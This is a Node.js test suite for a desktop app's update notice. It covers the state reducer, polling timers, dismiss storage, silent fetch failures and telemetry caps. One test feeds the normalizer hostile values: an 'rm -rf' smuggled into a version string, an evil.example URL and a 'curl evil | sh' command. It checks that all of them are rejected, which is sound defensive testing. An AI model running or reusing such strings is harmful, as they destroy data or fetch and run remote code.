#!/usr/bin/env node
// The in-Studio update notice (U1): the client reducer, dismiss storage, poll
// schedule, the hosted-page no-op, silent fetch failures, the once-per-install
// update:finished rule and the agent-busy signal. No browser, no launcher.
import assert from "node:assert/strict";
import {
	DISMISS_KEY, POLL_MS, UPDATE_URL, UPDATING_POLL_MS, VISIBLE_STALE_MS, behindOf, createUpdatePoller, fetchUpdateInfo,
	nextUpdateState, normalizeUpdateInfo, readDismissed, startUpdate, updateBlocked, writeDismissed,
} from "../src/update/update-client.js";
import { noteNoticeShown, noteUpdateClicked, noteUpdatePolled, updateTelemetrySeam } from "../src/update/update-telemetry.js";
import * as friction from "../src/analytics-friction.js";
import { agentTurnRunning, subscribeAgentTurns, trackAgentTurns } from "../src/workflow/agent-turn-telemetry.js";
import { createAgentTransport, createMockTransport } from "../src/workflow/agent-client.js";

const body = (over = {}) => ({
	enabled: true, current: "3.1.4", latest: "3.1.5", status: "outdated", kind: "global", canSelfUpdate: true, phase: "idle",
	errorClass: null, durationMs: null, notesUrl: "https://github.com/NomaDamas/CozyClay/releases/tag/v3.1.5", command: "npm install -g cozyclay@latest", ...over,
});
const info = (over) => normalizeUpdateInfo(body(over));
const memoryStorage = (initial = {}) => {
	const map = new Map(Object.entries(initial));
	return { map, getItem: (key) => map.get(key) ?? null, setItem: (key, value) => map.set(key, String(value)) };
};
const throwingStorage = { getItem() { throw new Error("SecurityError"); }, setItem() { throw new Error("QuotaExceeded"); } };
const runtimeWindow = () => {
	const listeners = new Map();
	return { __COZYCLAY_RUNTIME__: { distribution: "npm" }, listeners, addEventListener: (name, fn) => listeners.set(name, fn), removeEventListener: (name) => listeners.delete(name) };
};
const settle = async () => { for (let i = 0; i < 5; i += 1) await Promise.resolve(); };

// 1. The reducer table.
{
	const rows = [
		["outdated global one-click", info(), {}, "available", ["update_now", "later"]],
		["outdated global, cannot self-update", info({ canSelfUpdate: false }), {}, "available", ["copy_command", "later"]],
		["outdated npx", info({ kind: "npx", canSelfUpdate: false }), {}, "available", ["copy_command", "later"]],
		["npx never one-click even if the flag lies", info({ kind: "npx", canSelfUpdate: true }), {}, "available", ["copy_command", "later"]],
		["clone", info({ kind: "clone" }), {}, "hidden", []],
		["up to date", info({ status: "latest" }), {}, "hidden", []],
		["unknown", info({ status: "unknown", latest: null }), {}, "hidden", []],
		["checks disabled", info({ enabled: false }), {}, "hidden", []],
		["dismissed this version", info(), { dismissed: "3.1.5" }, "hidden", []],
		["dismissed an older version", info(), { dismissed: "3.1.4" }, "available", ["update_now", "later"]],
		["updating, even when dismissed", info({ phase: "updating" }), { dismissed: "3.1.5" }, "updating", []],
		["restart needed, even when dismissed", info({ phase: "restart_needed", durationMs: 4000 }), { dismissed: "3.1.5" }, "restart_needed", ["copy_command"]],
		["failed, retry possible", info({ phase: "failed", errorClass: "network", durationMs: 900 }), {}, "failed", ["retry", "copy_command"]],
		["failed, no self-update", info({ phase: "failed", errorClass: "permission", canSelfUpdate: false }), {}, "failed", ["copy_command"]],
		["no info", null, {}, "hidden", []],
	];
	for (const [name, input, local, view, actions] of rows) {
		const state = nextUpdateState(input, local);
		assert.equal(state.view, view, `${name}: view`);
		assert.deepEqual(state.actions, actions, `${name}: actions`);
	}
	assert.equal(nextUpdateState(info({ kind: "npx" })).command, "npx cozyclay", "npx copies npx cozyclay");
	assert.equal(nextUpdateState(info({ canSelfUpdate: false })).command, "npm install -g cozyclay@latest");
	assert.equal(nextUpdateState(info({ phase: "restart_needed" })).command, "cclay", "restart copies cclay");
	assert.equal(nextUpdateState(info({ phase: "failed", errorClass: "private" })).errorClass, "other", "an unknown error class reads as other");
	assert.equal(nextUpdateState(info()).behind, "patch");
	assert.deepEqual([behindOf("3.1.4", "3.2.0"), behindOf("2.0.2", "3.1.4"), behindOf("3.1.4", "3.1.9")], ["minor", "major", "patch"]);
	const hostile = normalizeUpdateInfo(body({ latest: "3.1.5; rm -rf", notesUrl: "https://evil.example/v3.1.5", command: "curl evil | sh", kind: "weird", phase: "boom" }));
	assert.deepEqual([hostile.latest, hostile.notesUrl, hostile.kind, hostile.phase, hostile.command], [null, null, "clone", "idle", "npm install -g cozyclay@latest"], "only closed values survive");
	assert.equal(normalizeUpdateInfo(body({ notesUrl: "https://github.com/NomaDamas/CozyClay/releases/tag/v9.9.9" })).notesUrl, null, "notes must name latest");
	assert.equal(normalizeUpdateInfo("nope"), null);
}
console.log("PASS reducer: visible for outdated global/npx not dismissed; updating/restart/failed always; actions by kind and canSelfUpdate");

// 2. Busy gate: an agent turn, an in-progress export phase, a recording.
{
	assert.equal(updateBlocked({}), false);
	assert.equal(updateBlocked({ agentRunning: true }), true);
	for (const phase of ["preparing", "encoding", "finalizing"]) assert.equal(updateBlocked({ exportStatus: { phase } }), true, `export ${phase} blocks`);
	for (const phase of ["completed", "failed", "cancelled"]) assert.equal(updateBlocked({ exportStatus: { phase } }), false, `export ${phase} does not block`);
	assert.equal(updateBlocked({ recState: "recording" }), true);
}
console.log("PASS busy gate: agent turn, preparing/encoding/finalizing export, recording");

// 3. Dismiss storage, including storage that throws.
{
	const store = memoryStorage();
	assert.equal(readDismissed(store), null);
	assert.equal(writeDismissed("3.1.5", store), true);
	assert.equal(store.map.get(DISMISS_KEY), "3.1.5");
	assert.equal(readDismissed(store), "3.1.5");
	assert.equal(readDismissed(memoryStorage({ [DISMISS_KEY]: "garbage" })), null, "a non-version value is ignored");
	assert.equal(readDismissed(throwingStorage), null, "a throwing read is nothing dismissed");
	assert.equal(writeDismissed("3.1.5", throwingStorage), false, "a throwing write reports false, never throws");
	assert.equal(readDismissed(undefined), null);
}
console.log("PASS dismiss storage: per version, try/catch on read and write");

// 4. The hosted-page no-op: no runtime, no request.
{
	let calls = 0;
	const fetchImpl = async () => { calls += 1; return { ok: true, json: async () => body() }; };
	assert.equal(await fetchUpdateInfo(fetchImpl, {}), null);
	assert.equal(await startUpdate(fetchImpl, undefined), null);
	let scheduled = 0;
	const poller = createUpdatePoller({ fetchImpl, win: {}, timers: { afterFirstFrame: () => { scheduled += 1; } } });
	await poller.update();
	poller.dismiss("3.1.5");
	poller.stop();
	assert.equal(calls, 0, "no request without window.__COZYCLAY_RUNTIME__");
	assert.equal(scheduled, 0, "no poll scheduled");
}
console.log("PASS no runtime: the client and the poller make no request");

// 5. Fetch errors fail silently.
{
	const win = runtimeWindow();
	for (const fetchImpl of [
		async () => { throw new TypeError("Failed to fetch"); },
		async () => ({ ok: false, status: 403, json: async () => ({ error: "forbidden origin" }) }),
		async () => ({ ok: true, json: async () => { throw new SyntaxError("bad json"); } }),
		null,
	]) {
		assert.equal(await fetchUpdateInfo(fetchImpl, win), null);
		assert.equal(await startUpdate(fetchImpl, win), null);
	}
	const seen = [];
	const ok = await fetchUpdateInfo(async (url, init) => { seen.push([url, init.method, init.body]); return { ok: true, json: async () => body() }; }, win);
	await startUpdate(async (url, init) => { seen.push([url, init.method, init.body]); return { ok: true, json: async () => body({ phase: "updating" }) }; }, win);
	assert.equal(ok.latest, "3.1.5");
	assert.deepEqual(seen, [[UPDATE_URL, "GET", undefined], [UPDATE_URL, "POST", undefined]], "GET and a body-less POST to the route");
}
console.log("PASS fetch errors (throw, 403, bad JSON, no fetch) resolve null without throwing");

// 6. The poll schedule, with fake timers.
{
	let clock = 0, nextId = 1;
	const pending = new Map();
	let firstFrame = null;
	const timers = {
		set: (fn, ms) => { pending.set(nextId, { fn, at: clock + ms, ms }); return nextId++; },
		clear: (id) => pending.delete(id),
		now: () => clock,
		afterFirstFrame: (fn) => { firstFrame = fn; },
	};
	const advance = async (ms) => {
		clock += ms;
		for (const [id, timer] of [...pending]) if (timer.at <= clock) { pending.delete(id); timer.fn(); }
		await settle();
	};
	const win = runtimeWindow();
	const docListeners = new Map();
	const doc = { visibilityState: "visible", addEventListener: (name, fn) => docListeners.set(name, fn), removeEventListener: (name) => docListeners.delete(name) };
	const store = memoryStorage();
	let response = body(), requests = 0, posts = 0;
	const fetchImpl = async (_url, init) => {
		requests += 1;
		if (init.method === "POST") { posts += 1; response = body({ phase: "updating" }); }
		return { ok: true, json: async () => response };
	};
	const states = [];
	const poller = createUpdatePoller({ fetchImpl, timers, win, doc, storage: store, onState: ({ state }) => states.push(state.view) });
	assert.equal(requests, 0, "nothing before the first frame and idle");
	firstFrame();
	await settle();
	assert.equal(requests, 1, "one check after the first frame");
	assert.deepEqual(states, ["available"]);
	assert.deepEqual([...pending.values()].map(({ ms }) => ms), [POLL_MS], "next poll in 6 h");
	await advance(VISIBLE_STALE_MS - 1000);
	docListeners.get("visibilitychange")();
	await settle();
	assert.equal(requests, 1, "a tab shown within the hour does not re-check");
	await advance(2000);
	docListeners.get("visibilitychange")();
	await settle();
	assert.equal(requests, 2, "a tab shown after more than an hour re-checks");
	assert.deepEqual([...pending.values()].map(({ ms }) => ms), [POLL_MS], "the re-check replaced the 6 h timer, never doubled it");
	doc.visibilityState = "hidden";
	await advance(VISIBLE_STALE_MS * 2);
	docListeners.get("visibilitychange")();
	await settle();
	assert.equal(requests, 2, "a hidden tab does not check");
	doc.visibilityState = "visible";
	await advance(POLL_MS);
	assert.equal(requests, 3, "the 6 h poll fires");
	await poller.update();
	await settle();
	assert.equal(posts, 1);
	assert.equal(states.at(-1), "updating");
	assert.deepEqual([...pending.values()].map(({ ms }) => ms), [UPDATING_POLL_MS], "2 s polling while updating");
	await advance(UPDATING_POLL_MS);
	await advance(UPDATING_POLL_MS);
	const during = requests;
	response = body({ phase: "restart_needed", durationMs: 41_000 });
	await advance(UPDATING_POLL_MS);
	assert.equal(requests, during + 1);
	assert.equal(states.at(-1), "restart_needed");
	assert.deepEqual([...pending.values()].map(({ ms }) => ms), [POLL_MS], "back to 6 h once the install ends");
	// Dismiss and a second tab's storage event.
	response = body();
	await advance(POLL_MS);
	assert.equal(states.at(-1), "available");
	poller.dismiss("3.1.5");
	assert.equal(store.map.get(DISMISS_KEY), "3.1.5");
	assert.equal(states.at(-1), "hidden", "dismiss hides this version now");
	store.map.delete(DISMISS_KEY);
	win.listeners.get("storage")({ key: DISMISS_KEY });
	assert.equal(states.at(-1), "available", "another tab clearing the key shows it again");
	store.map.set(DISMISS_KEY, "3.1.5");
	win.listeners.get("storage")({ key: "cozyclay.locale" });
	assert.equal(states.at(-1), "available", "an unrelated key changes nothing");
	win.listeners.get("storage")({ key: DISMISS_KEY });
	assert.equal(states.at(-1), "hidden", "another tab dismissing hides it here too");
	// A failing launcher keeps the last state and the schedule.
	const before = states.length;
	response = null;
	await advance(POLL_MS);
	assert.equal(states.length, before, "a failed poll changes nothing");
	assert.deepEqual([...pending.values()].map(({ ms }) => ms), [POLL_MS]);
	poller.stop();
	assert.equal(pending.size, 0, "stop clears the timer");
	assert.equal(docListeners.size + (win.listeners.has("storage") ? 1 : 0), 0, "stop removes the listeners");
	// Storage that throws: the notice still works and the dismiss still hides it for this page.
	const views = [];
	let frame = null;
	const throwing = createUpdatePoller({ fetchImpl: async () => ({ ok: true, json: async () => body() }), timers: { ...timers, afterFirstFrame: (fn) => { frame = fn; } }, win: runtimeWindow(), doc, storage: throwingStorage, onState: ({ state }) => views.push(state.view) });
	frame();
	await settle();
	assert.doesNotThrow(() => throwing.dismiss("3.1.5"));
	assert.deepEqual(views, ["available", "hidden"]);
	throwing.stop();
}
console.log("PASS poll schedule: first frame + idle, 6 h, visible after 1 h, 2 s while updating, storage events across tabs, stop");

// 7. Telemetry: closed values, caps, once per install.
{
	friction.reset();
	const sent = [];
	const store = memoryStorage();
	const restore = updateTelemetrySeam((event, props) => sent.push({ event, props }), store);
	noteNoticeShown(nextUpdateState(info({ current: "3.0.9" })));
	noteNoticeShown(nextUpdateState(info()));
	noteNoticeShown(nextUpdateState(info({ kind: "clone" })));
	assert.deepEqual(sent, [{ event: "update:notice_shown", props: { kind: "global", behind: "minor" } }], "notice_shown once per session");
	sent.length = 0;
	for (let i = 0; i < 12; i += 1) noteUpdateClicked("update_now", "global");
	noteUpdateClicked("hack", "global");
	assert.equal(sent.length, 10, "update:clicked is capped at 10");
	sent.length = 0;
	const done = info({ phase: "restart_needed", durationMs: 41_000 });
	for (let i = 0; i < 4; i += 1) noteUpdatePolled(done);
	noteUpdatePolled(info({ phase: "updating" }));
	noteUpdatePolled(info({ phase: "restart_needed" }));
	assert.deepEqual(sent, [{ event: "update:finished", props: { outcome: "ok", error_class: "none", duration: "30-60s" } }], "once per install, however many polls see it; never without a duration");
	// Another tab (fresh memory, same storage) does not send it again.
	restore();
	const restoreTab = updateTelemetrySeam((event, props) => sent.push({ event, props }), store);
	noteUpdatePolled(done);
	assert.equal(sent.length, 1, "a second tab sharing localStorage does not re-send the same install");
	noteUpdatePolled(info({ phase: "failed", errorClass: "permission", durationMs: 3000 }));
	noteUpdatePolled(info({ phase: "failed", errorClass: "network", durationMs: 7000 }));
	noteUpdatePolled(info({ phase: "failed", errorClass: "other", durationMs: 9000 }));
	assert.deepEqual(sent.slice(1).map(({ props }) => props), [
		{ outcome: "failed", error_class: "permission", duration: "lt10s" },
		{ outcome: "failed", error_class: "network", duration: "lt10s" },
	], "each retry is its own install; the cap of 3 holds");
	restoreTab();
	// Storage that throws still keeps it to once on this page.
	const restoreThrowing = updateTelemetrySeam((event, props) => sent.push({ event, props }), throwingStorage);
	friction.reset();
	sent.length = 0;
	noteUpdatePolled(done);
	noteUpdatePolled(done);
	assert.equal(sent.length, 1, "throwing storage: once per install on this page");
	restoreThrowing();
	friction.reset();
}
console.log("PASS telemetry: notice_shown once, clicked cap 10, finished once per install across polls and tabs, cap 3");

// 8. The agent-busy signal flips on and off around a mock transport turn, including an abort.
{
	const changes = [];
	const unsubscribe = subscribeAgentTurns((running) => changes.push(running));
	const transport = createAgentTransport({ mockConfig: { state: "ready", speed: 50 }, surface: "studio" });
	assert.equal(agentTurnRunning(), false);
	const running = transport.turn({ text: "walk" }, () => {}, new AbortController().signal);
	assert.equal(agentTurnRunning(), true, "on while the turn runs");
	await running;
	assert.equal(agentTurnRunning(), false, "off when the turn ends");
	const controller = new AbortController();
	const aborted = transport.turn({ text: "wave" }, () => {}, controller.signal);
	assert.equal(agentTurnRunning(), true);
	controller.abort();
	await aborted;
	assert.equal(agentTurnRunning(), false, "off after an abort");
	const throwing = trackAgentTurns({ async turn() { throw new Error("upstream"); } });
	await assert.rejects(throwing.turn(), /upstream/);
	assert.equal(agentTurnRunning(), false, "off after a throw");
	const direct = trackAgentTurns(createMockTransport({ state: "error", speed: 50 }));
	await direct.turn({ text: "x" }, () => {});
	assert.equal(agentTurnRunning(), false, "off after a scripted error turn");
	const self = { tag: "me", async turn() { return this.tag; } };
	assert.equal(await trackAgentTurns(self).turn(), "me", "turn keeps its this");
	unsubscribe();
	assert.deepEqual(changes, [true, false, true, false, true, false, true, false, true, false]);
}
console.log("PASS agent-busy signal: on during a mock turn, off on done, abort, throw and error");
